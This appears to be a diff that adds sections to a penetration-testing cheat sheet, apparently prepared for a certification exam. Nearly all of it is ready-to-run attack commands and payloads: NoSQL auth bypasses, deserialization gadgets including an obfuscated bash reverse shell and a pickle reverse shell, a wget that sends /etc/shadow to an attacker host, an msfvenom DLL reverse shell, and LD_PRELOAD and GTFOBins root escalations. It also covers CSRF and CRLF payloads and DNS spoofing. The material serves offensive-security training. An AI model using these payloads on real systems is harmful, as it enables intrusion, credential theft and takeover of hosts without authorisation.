+curl -d 'username=test2&password=Test123!&email=t2@t&admin=true' http://target/register
+curl -d 'username=test3&password=Test123!&email=t3@t&confirmed=1' http://target/register
+curl -d 'username=test4&password=Test123!&email=t4@t&role=administrator' http://target/register
+
+# 3. Burp Repeater — fuzz parameter names from common-attrs wordlist
+# /usr/share/seclists/Discovery/Web-Content/api/objects-attributes.txt
+
+# 4. JSON variant
+curl -X POST http://target/api/users -H 'Content-Type: application/json' \
+  -d '{"username":"test5","password":"Test123!","admin":true,"role":"admin"}'
+
+# 5. Profile-update IDOR-ish — change other user's role
+curl -X PUT http://target/api/users/me -H 'Cookie: session=...' \
+  -d '{"email":"new@t","role":"admin"}'
+```
+
+**Common attribute name wordlist:**
+```
+admin, is_admin, isAdmin, role, roles, permission, permissions, level,
+priv, privilege, group, group_id, approved, confirmed, verified, active,
+status, type, account_type, user_type, balance, credits, points, vip,
+superuser, staff, owner, deleted, is_deleted, password, password_hash
+```
+
+## 3.16 - NoSQL Injection (MongoDB / CouchDB / Redis-backed)
+> When app uses MongoDB / CouchDB and passes user input to query operators.
+> Detection differs from SQLi — uses JSON / operator injection, not quote escaping.
+
+```
+Decision: App backend is MongoDB / CouchDB?
+├── Yes → Test operator injection in JSON body / URL params
+│   ├── Auth bypass: {"username":{"$ne":null},"password":{"$ne":null}}
+│   ├── Auth bypass: {"username":"admin","password":{"$gt":""}}
+│   ├── Regex extraction: {"username":"admin","password":{"$regex":"^a"}}
+│   ├── Where injection: {"$where":"this.password.match(/^a/)"}
+│   ├── Time-based: {"$where":"sleep(5000)"}
+│   └── PHP-Mongo: ?username[$ne]=&password[$ne]=  (form-encoded operators)
+└── No → skip
+```
+
+**Auth bypass payloads (POST body, app/json):**
+```json
+{"username":{"$ne":null},"password":{"$ne":null}}
+{"username":"admin","password":{"$ne":"x"}}
+{"username":{"$gt":""},"password":{"$gt":""}}
+{"username":{"$in":["admin","root","administrator"]},"password":{"$ne":null}}
+```
+
+**Auth bypass (PHP-style array operators in form/URL):**
+```
+POST /login HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+username[$ne]=&password[$ne]=
+username[$regex]=^adm&password[$ne]=
+```
+
+**Blind data extraction via regex (char-by-char):**
+```bash
+# Iterate alphabet → if response length differs, char matched
+for c in {a..z} {A..Z} {0..9}; do
+  curl -s -X POST http://target/login \
+    -H 'Content-Type: application/json' \
+    -d "{\"username\":\"admin\",\"password\":{\"\$regex\":\"^${c}\"}}" \
+    | grep -q "success" && echo "match: $c"
+done
+```
+
+**$where JavaScript injection (MongoDB <4.4 + Node.js apps):**
+```
+?username=admin&password=' || '1'=='1
+?search=admin'; return true; var x='
+?search=admin'; sleep(5000); '
+```
+
+**Tools:**
+```bash
+# NoSQLMap (sqlmap-style automation)
+python3 nosqlmap.py
+# Menu → 1 Set options → 4 Manage attacks → MongoDB
+
+# Mongo-bigfuck (auth bypass + extraction)
+python3 mongoaudit.py <target> 27017
+```
+
+**CouchDB injection (CVE-2017-12635 — privilege escalation via duplicate keys):**
+```bash
+curl -X PUT http://<target>:5984/_users/org.couchdb.user:admin \
+  -H "Content-Type: application/json" \
+  -d '{"type":"user","name":"admin","roles":["_admin"],"roles":[],"password":"pwn"}'
+# Duplicate roles key — first wins for parsing, second for validation → privilege grant
+```
+
+## 3.17 - Insecure Deserialization
+> User-controlled serialized blob → app deserializes → gadget chain → RCE.
+> CPTS Common Apps module covers Java + PHP deserialization.
+
+```
+Decision: App accepts serialized objects?
+├── Java   → look for: rO0AB (base64 of 0xAC 0xED magic), ViewState, RMI
+├── PHP    → look for: O:<n>:"ClassName": pattern, phar:// wrapper
+├── Python → look for: pickle blobs (gASV...), base64 starting with "gA"
+├── .NET   → look for: AAEAAAD///// (BinaryFormatter magic), ViewState
+├── Ruby   → look for: Marshal data, YAML.load on user input
+└── No → skip
+```
+
+**Java — ysoserial (gadget chain generator):**
+```bash
+# Identify Java deserialization endpoint (Burp extension: Java Deserialization Scanner)
+# Magic bytes: AC ED 00 05 (raw) or rO0AB (base64)
+
+# Pick gadget based on libraries in classpath
+java -jar ysoserial.jar
+# Common gadgets: CommonsCollections1-7, Spring1-2, Hibernate1-2, JRMPClient, URLDNS (detection)
+
+# Detection: URLDNS (causes DNS lookup to attacker — no RCE, just confirm vuln)
+java -jar ysoserial.jar URLDNS "http://<attacker>.burpcollab.net/" | base64 -w0
+
+# RCE: CommonsCollections5 (most common)
+java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}' > payload.bin
+
+# Send via Burp Repeater — content-type: application/x-java-serialized-object
+curl -X POST http://target/endpoint --data-binary @payload.bin -H "Content-Type: application/x-java-serialized-object"
+```
+
+**PHP — unserialize() abuse + Phar wrapper:**
+```php
+// Vulnerable pattern: unserialize($_COOKIE['data'])
+// Build payload with PHPGGC (PHP gadget chain generator)
+phpggc Laravel/RCE5 'system' 'id' -b   // base64 output for cookie
+phpggc Symfony/RCE4 system id          // raw
+phpggc Drupal/RCE -b system id
+
+// Phar deserialization (no explicit unserialize() needed)
+// Trigger: file_exists("phar://uploaded.jpg") on any file_*() function
+phpggc -p phar -f Monolog/RCE1 system 'id' shell.phar
+mv shell.phar shell.jpg
+// Upload as image, then trigger: file_exists("phar://./uploads/shell.jpg")
+```
+
+**Python pickle (always RCE if deserialized):**
+```python
+import pickle, base64, os
+class RCE:
+    def __reduce__(self):
+        return (os.system, ('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"',))
+print(base64.b64encode(pickle.dumps(RCE())).decode())
+# Send as cookie / body / parameter that gets pickled
+```
+
+**.NET ViewState / BinaryFormatter — ysoserial.net:**
+```powershell
+# ysoserial.net
+.\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -e <base64>"
+.\ysoserial.exe -g WindowsIdentity -f Json.Net -c "calc.exe"
+
+# ViewState (needs __VIEWSTATEGENERATOR + machineKey)
+# If machineKey leaked (web.config disclosure) → RCE
+.\ysoserial.exe -p ViewState -g TypeConfuseDelegate \
+  -c "powershell -e <base64>" \
+  --path="/page.aspx" --apppath="/" \
+  --validationalg="SHA1" --validationkey="<key>"
+```
+
+**Ruby — Marshal / YAML:**
+```ruby
+# Marshal.load on user input = RCE
+# Universal Marshal gadget — see GitHub jcsxv/ruby-marshal-poc
+
+# YAML.load (Rails <5) — !ruby/object tag abuse
+yaml_payload="--- !ruby/object:Gem::Installer\n  i: x\n"
+```
+
+## 3.18 - Open Redirect
+> User-controlled URL in redirect param → arbitrary external redirect.
+> Standalone severity = Low. Chains to OAuth token theft / SSRF / phishing.
+
+```
+Decision: App redirects based on user param? (returnTo, next, redirect, url, callback)
+├── Yes → Inject attacker-controlled URL
+│   ├── Direct: ?next=https://attacker.com
+│   ├── Protocol-relative: ?next=//attacker.com
+│   ├── Backslash bypass: ?next=https:\\attacker.com  or  ?next=\\attacker.com
+│   ├── @-trick: ?next=https://target.com@attacker.com
+│   ├── Whitelist bypass: ?next=https://attacker.com.target.com  or  attacker.com#target.com
+│   ├── Path traversal: ?next=/..//attacker.com
+│   ├── URL encoding: ?next=https%3A%2F%2Fattacker.com
+│   ├── CRLF chain: ?next=https://target.com%0d%0a%0d%0a<script>...
+│   └── Data scheme: ?next=data:text/html,<script>alert(1)</script>
+└── No → skip
+```
+
+**Bypass table (whitelisted domains):**
+```
+Target whitelist: must contain "target.com"
+
+attacker.com?target.com          ← if regex misses anchor
+target.com.attacker.com          ← prefix-only check
+attacker.com/target.com          ← path-only check
+https://attacker.com#@target.com ← fragment confuses parser
+//attacker.com\@target.com       ← Node.js URL parser quirk
+javascript:alert(1)//target.com  ← scheme check missed
+```
+
+**Chains:**
+```
+Open Redirect + OAuth → steal access_token in URL fragment
+  oauth flow returns to redirect_uri with #access_token=...
+  if redirect_uri whitelist permissive → attacker.com receives token
+Open Redirect + SAML → relay SAMLResponse to attacker IdP-consumer
+Open Redirect + CSRF token leak via Referer
+Open Redirect + Cache poisoning (web cache deception)
+```
+
+## 3.19 - CSRF (Cross-Site Request Forgery)
+> Victim's browser carries cookies on cross-origin request → state change without consent.
+> Detection: state-change endpoint with no CSRF token / weak token / token not validated.
+
+```
+Decision: Sensitive state-change action?
+├── No CSRF token? → trivial CSRF, build PoC HTML
+├── Token present?
+│   ├── Token not validated? → omit token in PoC, send anyway
+│   ├── Token not bound to user? → use attacker's token
+│   ├── Token in cookie only (double-submit broken)? → strip cookie check
+│   ├── Token validated only on POST? → switch to GET
+│   ├── SameSite=Lax / None? → embed in iframe / form submit
+│   └── Method bypass: PUT/DELETE not protected
+├── JSON body? → form-data CSRF via Content-Type: text/plain trick
+└── No → skip
+```
+
+**PoC HTML (simple form CSRF):**
+```html
+<html><body>
+<form action="https://target.com/changeEmail" method="POST">
+  <input type="hidden" name="email" value="attacker@evil.com">
+</form>
+<script>document.forms[0].submit();</script>
+</body></html>
+<!-- Host on attacker site, victim visits → email changed -->
+```
+
+**JSON CSRF (via text/plain Content-Type confusion):**
+```html
+<form action="https://target/api/profile" method="POST" enctype="text/plain">
+  <input name='{"email":"a@evil.com","x":"' value='"}'>
+</form>
+<script>document.forms[0].submit();</script>
+<!-- Body sent: {"email":"a@evil.com","x":"="} — parses as JSON -->
+```
+
+**CSRF token bypass checks (test each):**
+```
+1. Remove token entirely → does it work?
+2. Use empty token (token=) → does it work?
+3. Use attacker's own valid token on victim's session → does it work?
+4. Modify token (flip one char) → does request still succeed?
+5. Change request method (POST → GET) → does CSRF protection follow?
+6. Re-use token from prior request (replay)
+```
+
+**SameSite bypass tactics:**
+```
+SameSite=Lax allows top-level GET cross-site → use <a href=...> + GET endpoint
+SameSite=None requires Secure flag → HTTPS only
+SameSite=Strict — chain with XSS / subdomain takeover for same-origin
+```
+
+## 3.20 - CRLF Injection / HTTP Response Splitting
+> Inject \r\n into header context → forge headers / split response → cache poisoning / XSS.
+
+```
+Decision: User input reflected in HTTP response header?
+├── Set-Cookie? → ?lang=en%0d%0aSet-Cookie:%20sessionid=ATTACKER
+├── Location?   → ?url=https://target%0d%0a%0d%0a<html>... (response split)
+├── Other header? → custom header injection
+└── No → skip
+```
+
+**Payloads:**
+```
+%0d%0a            # \r\n
+%0a               # \n alone (some servers accept)
+%E5%98%8A%E5%98%8D # Unicode CRLF bypass (overlong)
+%23%0d%0a         # Fragment + CRLF
+
+# Cookie injection
+/redirect?url=https://target.com%0d%0aSet-Cookie:%20admin=true
+
+# Header injection + XSS
+/page?lang=en%0d%0aContent-Length:%200%0d%0a%0d%0a<html><script>alert(1)</script></html>
+
+# Cache poisoning
+/page?lang=en%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<malicious>
+```
+
+## 3.21 - PHP Type Juggling & Magic Hashes
+> `==` loose comparison in PHP coerces types → string "0e..." treated as scientific notation 0 → bypass.
+> CPTS Web Attacks edge case — common in login + hash comparison code.
+
+```
+Decision: PHP backend using == on user-controlled values?
+├── md5($input)==md5($secret) with == → magic hash bypass
+├── strcmp($a, $b)==0 with array → strcmp returns NULL, NULL==0 → bypass
+├── in_array($x, $arr) without strict → "1abc" matches 1
+└── No → skip
+```
+
+**Magic hash collisions (md5 / sha1 starting with "0e"):**
+```
+md5("240610708") = 0e462097431906509019562988736854  # numeric → 0
+md5("QNKCDZO")  = 0e830400451993494058024219903391  # numeric → 0
+sha1("aaroZmOk") = 0e66507019969427134894567494305185566735  # numeric → 0
+
+Login bypass: if(md5($pass) == $stored_hash)
+  Stored hash = 0e123... → submit pass "240610708" → both coerce to 0 → match
+```
+
+**strcmp() bypass with array:**
+```php
+// Vulnerable: if (strcmp($_POST['password'], $real_password) == 0)
+// strcmp(array, string) returns NULL → NULL == 0 → true
+POST: password[]=anything
+```
+
+**Other juggling tricks:**
+```
+"0" == false       → true
+"abc" == 0         → true (PHP <8)
+"1abc" == 1        → true (PHP <8)
+null == 0          → true
+[] == false        → true
+"0e123" == "0e456" → true (both = 0 scientific)
+```
+
+**preg_match() bypass with array:**
+```php
+// Vulnerable: if (preg_match("/^[a-z]+$/", $_GET['input']))
+// preg_match on array returns false → if check inverted bypass
+?input[]=admin
+```
+
+## 3.22 - HTTP Parameter Pollution (HPP)
+> Multiple params with same name → server picks first / last / array / concat differently.
+> Used to bypass WAF / sanitization / cause unexpected backend logic.
+
+```
+Backend behavior table:
+ASP.NET     → first OR concatenated with ","
+PHP/Apache  → last
+JSP/Tomcat  → first
+Node.js     → array
+Python/Flask → first
+Ruby/Rails  → last
+```
+
+**Test:**
+```bash
+# Send duplicate params, observe response
+curl "http://target/page?id=1&id=2"
+# WAF on first, app on last → bypass
+curl "http://target/login?role=admin&role=user"
+```
+
+**Use cases:**
+```
+WAF bypass:    ?q=safe&q=<script>alert(1)</script>      (WAF checks first, app uses last)
+Auth bypass:   ?role=user&role=admin                    (PHP picks last)
+Logic abuse:   ?to=victim&to=attacker&amount=100        (multiple recipients)
+```
+
+## 3.23 - WebDAV PUT Upload (server-side)
+> Misconfigured WebDAV allows PUT — upload webshell directly to webroot.
+> Distinct from §10B WebDAV client-side transfer to attacker share.
+
+```
+Decision: HTTP OPTIONS shows PUT/MOVE/DELETE methods on web path?
+├── Yes → Try PUT upload
+│   ├── PUT shell.txt → 201 Created → server allows arbitrary file PUT
+│   ├── Direct .php/.asp/.jsp PUT? → 403/415 = filtered
+│   └── MOVE bypass: PUT shell.txt → MOVE to shell.php
+└── No → skip
+```
+
+**Detection:**
+```bash
+# OPTIONS scan
+curl -X OPTIONS -i http://target/path/
+# Look for: Allow: GET, POST, PUT, DELETE, MOVE, COPY
+
+# Nmap
+nmap --script http-methods --script-args http-methods.url-path='/' -p 80 <target>
+
+# davtest (full WebDAV scanner)
+davtest -url http://<target>/path/
+# Tests PUT, MOVE, COPY, LOCK with multiple extensions
+```
+
+**Exploit — direct PUT:**
+```bash
+# IIS WebDAV PROPFIND + PUT
+cadaver http://<target>/
+dav:/> put shell.asp
+dav:/> propfind shell.asp
+
+curl -X PUT http://<target>/shell.aspx --data-binary @shell.aspx
+
+# Apache mod_dav with no auth
+curl -T shell.php http://<target>/upload/shell.php
+curl -X PUT http://<target>/uploads/shell.jsp -d @shell.jsp
+```
+
+**Exploit — PUT txt + MOVE to exec extension:**
+```bash
+# When .php PUT blocked but .txt allowed
+curl -T shell.txt http://<target>/uploads/shell.txt
+curl -X MOVE -H "Destination: http://<target>/uploads/shell.php" http://<target>/uploads/shell.txt
+curl http://<target>/uploads/shell.php?cmd=id
+```
+
+**IIS-specific extension trick:**
+```bash
+# IIS 6.0 ;.txt extension trick (CVE-2009-4444)
+curl -T shell.asp;.txt http://<target>/uploads/shell.asp;.txt
+# IIS treats as .asp, OS treats as .txt → bypasses filename filter
 ```
 
 ---
@@ -1671,14 +2590,45 @@ evil-winrm -i <target> -u <user> -H <nt_hash>
 
 ## 4.7 - DNS (Port 53)
 ```bash
-# Zone transfer (information disclosure)
+# Zone transfer (information disclosure — high-value)
 dig AXFR @<dns_server> <domain>
+dig AXFR @<dns_server> <internal_domain>     # try internal-only zones too
 
 # Record enumeration
 dig ANY <domain> @<dns_server>
 dig A <domain> @<dns_server>
 dig MX <domain> @<dns_server>
 dig TXT <domain> @<dns_server>
+dig version.bind CHAOS TXT @<dns_server>     # BIND version → CVE lookup
+
+# Subdomain Takeover (when CNAME points to expired third-party)
+# 1. Enum subdomains
+subfinder -d <domain> -v
+amass enum -passive -d <domain>
+# 2. Resolve each → look for dangling CNAMEs pointing to S3/Heroku/GitHub/Azure
+for s in $(cat subdomains.txt); do
+  host $s | grep "is an alias for" && echo "[!] dangling CNAME: $s"
+done
+# 3. Check response — "NoSuchBucket" / "There isn't a GitHub Pages site here" = vulnerable
+curl -sI http://<subdomain> | head -20
+# 4. Reference: https://github.com/EdOverflow/can-i-take-over-xyz
+# 5. Claim the abandoned bucket/service → host malicious content on a trusted subdomain
+
+# DNS Cache Poisoning (local network MITM)
+# Ettercap
+sudo nano /etc/ettercap/etter.dns
+# Add:
+#   <target_domain>      A   <attacker_ip>
+#   *.<target_domain>    A   <attacker_ip>
+sudo ettercap -T -i <iface> -P dns_spoof -M arp:remote /<target_ip>// /<gateway>//
+
+# Bettercap
+sudo bettercap -iface <iface>
+> set dns.spoof.domains <target_domain>
+> set dns.spoof.address <attacker_ip>
+> set arp.spoof.targets <victim_ip>
+> dns.spoof on
+> arp.spoof on
 ```
 
 ## 4.8 - SMTP (Port 25)
@@ -1712,7 +2662,13 @@ openssl s_client -connect <target>:993
 
 # PHASE 5: PASSWORD ATTACKS
 
-> Get hashes FIRST (Phase 7/8/9), then crack here. Online attacks when cracking fails.
+> **Flow note:** This phase is NUMBERED 5 but RUNS IN PARALLEL with Phase 7/8/9 once hashes obtained.
+> Linear path: foothold (3+6) → cred harvest (7) → crack here (5) → privesc (8) → AD (9).
+> Online attacks (spraying, brute force) can ALSO run during Phase 1/4 if you have a userlist + no hashes yet.
+> Three trigger points to enter Phase 5:
+>   1. After Phase 7 dumps SAM/LSASS/shadow → crack offline
+>   2. After Phase 9.1.1 Responder → crack NetNTLMv2
+>   3. After Phase 9.4 Kerberoast / 9.1.7 AS-REP roast → crack TGS/AS-REP
 
 ---
 
@@ -1723,16 +2679,40 @@ hashid -j '<hash>'  # JtR format
 hashid -m '<hash>'  # Hashcat mode
 ```
 
-**Common Hash Formats:**
-| Type | Length | Hashcat Mode | JtR Format |
+**Common Hash Formats (memorize modes — exam-frequent):**
+| Type | Format/Length | Hashcat Mode | JtR Format |
 |------|--------|-------------|------------|
 | MD5 | 32 hex | 0 | raw-md5 |
 | SHA1 | 40 hex | 100 | raw-sha1 |
 | SHA256 | 64 hex | 1400 | raw-sha256 |
+| SHA512 | 128 hex | 1700 | raw-sha512 |
 | NTLM | 32 hex | 1000 | nt |
-| DCC2 | varies | 2100 | mscach2 |
+| NetNTLMv1 | user::DOMAIN:... | 5500 | netntlm |
+| NetNTLMv2 (Responder) | user::DOMAIN:...:... | 5600 | netntlmv2 |
+| LM | 32 hex | 3000 | lm |
+| Kerberos AS-REP | $krb5asrep$23$ | 18200 | krb5asrep |
+| Kerberos TGS-REP RC4 | $krb5tgs$23$ | 13100 | krb5tgs |
+| Kerberos TGS-REP AES256 | $krb5tgs$18$ | 19700 | krb5tgs-aes256 |
+| Kerberos TGS-REP AES128 | $krb5tgs$17$ | 19600 | krb5tgs-aes128 |
+| Kerberos PreAuth RC4 | $krb5pa$23$ | 7500 | krb5pa-md5 |
+| DCC (MSCash) | $DCC$ | 1100 | mscash |
+| DCC2 (MSCash2) | $DCC2$ | 2100 | mscash2 |
 | bcrypt | $2*$ | 3200 | bcrypt |
 | BitLocker | $bitlocker$0$ | 22100 | bitlocker |
+| KeePass | $keepass$ | 13400 | keepass |
+| ZIP (PKZIP) | $pkzip$ | 17200 | pkzip |
+| RAR3 | $RAR3$ | 12500 | rar |
+| RAR5 | $rar5$ | 13000 | rar5 |
+| 7-Zip | $7z$ | 11600 | 7z |
+| Office 2013+ | $office$ | 9600 | office2013 |
+| PDF 1.4-1.6 | $pdf$ | 10500 | pdf |
+| SSH (RSA/DSA) | $sshng$ | 22921 | ssh |
+| MD5(Wordpress) | $P$ | 400 | phpass |
+| SHA512crypt ($6$) | $6$salt$hash | 1800 | sha512crypt |
+| SHA256crypt ($5$) | $5$salt$hash | 7400 | sha256crypt |
+| MD5crypt ($1$) | $1$salt$hash | 500 | md5crypt |
+| yescrypt ($y$) | $y$j9T$salt$hash | (no native) | use john |
+| JWT (HMAC) | header.payload.sig | 16500 | HMAC-SHA256 |
 
 **Linux Shadow Hash Identification:**
 ```
@@ -2599,12 +3579,93 @@ ls -la /var/mail/ /var/spool/mail/ 2>/dev/null
 find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null
 ```
 
+### GTFOBins One-Liners (memorize — exam-frequent)
+```bash
+# SUID binaries (run as root if SUID bit set: chmod u+s)
+# Find: find / -user root -perm -4000 -type f 2>/dev/null
+./find . -exec /bin/sh -p \; -quit                       # find
+./vim.basic -c ':!/bin/sh -p'                            # vim
+./nmap --interactive    ;   !sh                          # nmap (old)
+./nmap --script=/path/to/script.nse                      # nmap (modern, NSE script)
+./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'   # perl
+./python -c 'import os; os.setuid(0); os.system("/bin/sh")'           # python
+./php -r "pcntl_exec('/bin/sh', ['-p']);"                # php
+./bash -p                                                # bash (with -p preserves SUID)
+./less file ; !sh                                        # less (pager escape)
+./more file ; !sh                                        # more
+./man man ; !sh                                          # man
+./awk 'BEGIN {system("/bin/sh")}'                        # awk
+./gdb -nx -ex 'python import os; os.execl("/bin/sh","sh","-p")' -ex quit   # gdb
+./env /bin/sh -p                                         # env
+./xxd /etc/shadow | xxd -r                               # xxd (read-only privesc)
+./cp /bin/sh /tmp/sh; chmod u+s /tmp/sh                  # cp (only if dest is SUID-honored)
+./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+./socat stdin exec:/bin/sh
+./node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
+./ruby -e 'exec "/bin/sh"'
+./screen
+./tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/.x.sh -Z root  # tcpdump postrotate
+./wget --post-file=/etc/shadow http://ATTACKER/          # read-only via wget
+./curl file:///etc/shadow                                # read-only via curl
+./ssh -o ProxyCommand=';sh 0<&2 1>&2' x                  # ssh ProxyCommand abuse
+./openssl req -in /etc/shadow                            # read-only via openssl (error msg leaks)
+
+# sudo abuse (sudo -l shows allowed)
+sudo /usr/bin/find . -exec /bin/sh \; -quit
+sudo /usr/bin/vim -c ':!/bin/sh'
+sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'
+sudo /usr/bin/python -c 'import os; os.system("/bin/sh")'
+sudo /usr/bin/perl -e 'exec "/bin/sh";'
+sudo /usr/bin/less /etc/profile     ; !sh
+sudo /usr/bin/man man               ; !sh
+sudo /usr/bin/zip /tmp/x.zip /etc/hosts -T --unzip-command="sh -c /bin/sh"
+sudo /usr/bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+sudo /usr/bin/apt-get changelog apt    ; !sh
+sudo /usr/bin/git -p help        ; !sh
+sudo /usr/bin/env /bin/sh
+
+# LD_PRELOAD (sudoers has env_keep+=LD_PRELOAD)
+cat > /tmp/pe.c <<EOF
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() { unsetenv("LD_PRELOAD"); setresuid(0,0,0); system("/bin/bash -p"); }
+EOF
+gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
+sudo LD_PRELOAD=/tmp/pe.so <any_allowed_sudo_binary>
+
+# LD_LIBRARY_PATH (sudoers has env_keep+=LD_LIBRARY_PATH AND binary uses shared libs)
+ldd /path/to/binary    # find a library it loads (e.g. libcustom.so)
+cat > /tmp/hijack.c <<EOF
+#include <stdio.h>
+#include <stdlib.h>
+static void hijack() __attribute__((constructor));
+void hijack() { unsetenv("LD_LIBRARY_PATH"); setresuid(0,0,0); system("/bin/bash -p"); }
+EOF
+gcc -o /tmp/libcustom.so -shared -fPIC /tmp/hijack.c
+sudo LD_LIBRARY_PATH=/tmp /path/to/binary
+
+# Wildcard injection (tar, chown, rsync, 7z, zip)
+# Cron runs: cd /backup; tar czf /tmp/x.tgz *
+echo "" > '/backup/--checkpoint=1'
+echo "" > '/backup/--checkpoint-action=exec=sh shell.sh'
+echo 'cp /bin/bash /tmp/bash; chmod u+s /tmp/bash' > /backup/shell.sh
+# Wait for cron → /tmp/bash is SUID root → /tmp/bash -p
+
+# Cron runs: chown root:root /var/log/*
+ln -s /etc/shadow /var/log/x   # if writable
+# After cron: shadow now owned by root:root (no change), but with --reference= tricks:
+echo "" > '/var/log/--reference=/tmp/payload'
+
+# Reference: https://gtfobins.github.io/
+```
+
 ### Decision Tree
 ```
 What do we have?
-├── sudo -l → GTFOBins for allowed commands
+├── sudo -l → GTFOBins for allowed commands (examples above)
 │   └── sudo -l shows (ALL) → direct sudo su
-├── SUID binary → Check against GTFOBins
+├── SUID binary → Check against GTFOBins (examples above)
 │   └── find / -user root -perm -4000 -type f 2>/dev/null
 ├── Writable cron script → Inject reverse shell
 │   └── Monitor with pspy64 -pf -i 1000
@@ -2759,6 +3820,84 @@ PrintSpoofer.exe -c "<reverse_shell>"
 
 # GodPotato (newer Windows, needs SeImpersonatePrivilege)
 GodPotato.exe -cmd "cmd /c <reverse_shell>"
+
+# RoguePotato (Server 2019/Win10 1809+, needs SeImpersonatePrivilege)
+RoguePotato.exe -r <attacker_ip> -e "cmd.exe /c <reverse_shell>" -l 9999
+
+# Check current privileges first
+whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken"
+```
+
+### Windows Built-in Group Abuse (often listed in `whoami /groups`)
+```powershell
+# === Backup Operators (SeBackupPrivilege + SeRestorePrivilege implicit) ===
+# 1. Dump SAM+SYSTEM via reg.exe save (uses backup priv)
+reg save HKLM\SAM C:\Windows\Temp\sam.save
+reg save HKLM\SYSTEM C:\Windows\Temp\system.save
+reg save HKLM\SECURITY C:\Windows\Temp\security.save
+# 2. Offline extraction
+secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+# 3. On DC: dump NTDS.dit via VSS / diskshadow
+diskshadow.exe /s commands.txt    # see §8.2 SeBackup chain
+
+# === Server Operators ===
+# Can stop/start services + modify binPath on existing services
+# 1. List services
+sc.exe query state= all
+# 2. Pick one running as SYSTEM (e.g. AppReadiness)
+sc.exe qc AppReadiness
+# 3. Replace binPath with reverse-shell payload, restart service
+sc.exe config AppReadiness binPath= "C:\Windows\Temp\shell.exe"
+sc.exe stop AppReadiness
+sc.exe start AppReadiness
+# 4. Restore original binPath after callback
+sc.exe config AppReadiness binPath= "C:\Windows\System32\AppReadiness.dll"
+
+# === Print Operators ===
+# SeLoadDriverPrivilege → load malicious driver → SYSTEM (Capcom.sys technique)
+# 1. Drop Capcom.sys + EOPLoadDriver.exe on target
+# 2. Load: EOPLoadDriver.exe System\CurrentControlSet\MyService C:\Temp\Capcom.sys
+# 3. Run exploit triggering Capcom → SYSTEM shell
+# Reference: github.com/tandasat/ExploitCapcom
+
+# === DnsAdmins ===
+# Can load arbitrary DLL into DNS service (runs as SYSTEM)
+# 1. Generate DLL payload
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker> LPORT=4444 -f dll > /tmp/mimilib.dll
+# 2. Drop DLL on share + set ServerLevelPluginDll
+dnscmd.exe <dc> /config /serverlevelplugindll \\<attacker>\share\mimilib.dll
+# 3. Restart DNS service (need to also be in Server Operators / Administrators)
+sc.exe \\<dc> stop dns
+sc.exe \\<dc> start dns
+# Alternative: wait for DNS to crash + restart
+
+# === Hyper-V Administrators ===
+# Can mount VHDs of any VM including DCs
+# 1. List VMs
+Get-VM
+# 2. Snapshot DC → offline-mount its VHD
+Checkpoint-VM -Name DC01
+Get-VMSnapshot -VMName DC01
+# 3. Mount VHD copy → access NTDS.dit / SAM directly
+Mount-VHD -Path C:\path\to\DC01-snapshot.vhdx -ReadOnly
+# 4. Extract NTDS.dit + SYSTEM hive → secretsdump.py LOCAL → krbtgt hash
+
+# === Event Log Readers ===
+# Can read Security log → may contain creds passed via cmdline (4688 events)
+wevtutil qe Security /q:"*[EventData[Data[@Name='SubjectUserName']!='SYSTEM']]" /c:30 /rd:true /f:text
+wevtutil qe Security /rd:true /f:text /q:"*[System[(EventID=4688)]]" | findstr /i "password pass user"
+# Old PowerShell logs (4688 if cmdline auditing enabled)
+Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4688]]" | ? { $_.Message -match "pass" }
+
+# === Account Operators ===
+# Can create/modify non-protected user accounts + add to non-admin groups
+net user backdoor Pass123! /add /domain
+# CANNOT modify Domain Admins / Account Operators / Backup Operators / Server Operators directly
+# But CAN modify GenericWrite-targets (chain via BloodHound)
+
+# === Group Policy Creator Owners ===
+# Can create new GPOs and link to OUs they own
+# Chain: create GPO with malicious scheduled task → link to OU containing target → run
 ```
 
 ### SeDebugPrivilege Abuse
@@ -2815,6 +3954,69 @@ copy C:\Windows\System32\<target>.dll C:\Users\<user>\AppData\Local\Microsoft\Wi
 # Verify writable path
 accesschk.exe /accepteula -w "C:\Program Files\Target" Users
 # Place malicious DLL in writable path → restart service
+```
+
+## 8.3 - Citrix / Restricted Desktop Breakout
+> Citrix, Terminal Services, AWS AppStream, CyberArk PSM, Kiosks — locked-down environments.
+> Goal: spawn `cmd.exe` from a restricted desktop, then privesc normally.
+
+**Method 1 — Dialog box → UNC path:**
+```
+1. Open ANY app with File→Open dialog (Paint, Notepad, WordPad, browser, even Help)
+2. In file-name field, type UNC path:
+   \\127.0.0.1\c$\windows\system32          → if you have local admin
+   \\127.0.0.1\c$\users\<user>              → bypass Explorer restrictions
+   \\<attacker>\share                       → reach attacker SMB share
+3. Right-click cmd.exe / pwn.exe → Open → command prompt spawned
+```
+
+**Method 2 — Alternate file manager:**
+```
+- Explorer++ (portable) → bypasses GP restrictions on Explorer
+- Q-Dir, FreeCommander → same
+- Drop via UNC share + run
+```
+
+**Method 3 — Alternate registry editor:**
+```
+- SmallRegistryEditor / SimpleRegEdit / UberRegEdit → bypass regedit lockdown
+```
+
+**Method 4 — Shortcut hijack:**
+```
+1. Right-click existing .lnk file → Properties
+2. Change Target to: C:\Windows\System32\cmd.exe
+3. Double-click → cmd spawned
+```
+
+**Method 5 — Script extension execution:**
+```bash
+# If .bat/.vbs/.ps1 still associated with interpreter
+echo cmd > evil.bat
